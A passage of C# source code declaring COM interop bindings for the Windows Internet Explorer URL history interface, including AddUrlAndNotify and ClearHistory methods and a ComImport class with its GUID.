            [return: MarshalAs(UnmanagedType.IUnknown)]
            get;

        }

        //Returns an enumerator for URLs
        void AddUrlAndNotify(string pocsUrl, string pocsTitle, int dwFlags, int fWriteHistory, object poctNotify, object punkISFolder);

        //does not work!
        void ClearHistory(); //Removes all history items

    }

    //UrlHistory class
    [ComImport]
    [Guid("3C374A40-BAE4-11CF-BF7D-00AA006946EE")]
    public class UrlHistoryClass
    {


    }
    #endregion
}
